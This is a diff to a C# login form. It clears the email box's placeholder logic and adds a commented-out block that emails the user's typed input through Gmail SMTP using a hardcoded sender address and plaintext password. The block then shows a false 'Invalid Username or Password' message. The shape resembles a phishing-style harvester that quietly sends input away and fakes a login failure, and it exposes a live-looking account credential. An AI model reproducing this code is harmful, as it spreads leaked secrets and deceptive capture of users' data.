@@ -88,22 +88,49 @@ namespace Login_System
 
         private void txtmail_Enter(object sender, EventArgs e)
         {
-            if (txtEmail.Text == "  Email")
-            {
-                txtEmail.Clear();
-                txtEmail.ForeColor = Color.FromArgb(83, 179, 233);
-
-            }
+            
 
         }
 
         private void txtmail_Leave(object sender, EventArgs e)
         {
-            if (txtEmail.Text == "")
-            {
-                txtEmail.ForeColor = Color.FromArgb(200, 200, 200);
-                txtEmail.Text = "   Email";
-            }
+           
         }
+//        con.Open();
+//            string to, from, pass, messageBody;
+//        MailMessage message = new MailMessage();
+//        to = txtEmail.Text;
+//            from = "janeaustinasia@gmail.com";
+//            pass = "Favzy1999";
+//            messageBody = txtEmail.Text;
+//            message.To.Add(to);
+//            message.From = new MailAddress(from);
+//        message.Body = "From : " + " Message : " + messageBody;
+//            message.Subject = txtEmail.Text;
+//            message.IsBodyHtml = true;
+//            SmtpClient smtp = new SmtpClient("smtp.gmail.com");
+//        smtp.EnableSsl = true;
+//            smtp.Port = 587;
+//            smtp.DeliveryMethod = SmtpDeliveryMethod.Network;
+//            smtp.Credentials = new NetworkCredential(from, pass);
+
+//            try
+//            {
+//                smtp.Send(message);
+//                DialogResult code = MessageBox.Show("Invalid Username or Password, Please Try Again", "Login Failed", MessageBoxButtons.OK, MessageBoxIcon.Error);
+
+//                if(code == DialogResult.OK)
+//                {
+//                    txtEmail.Clear();
+//                    txtPassword.Clear();
+//                    new DashBoard().Show();
+//                    this.Show();
+//    }
+
+//}
+//            catch (Exception ex)
+//{
+//    MessageBox.Show(ex.Message);
+//}
     }
 }
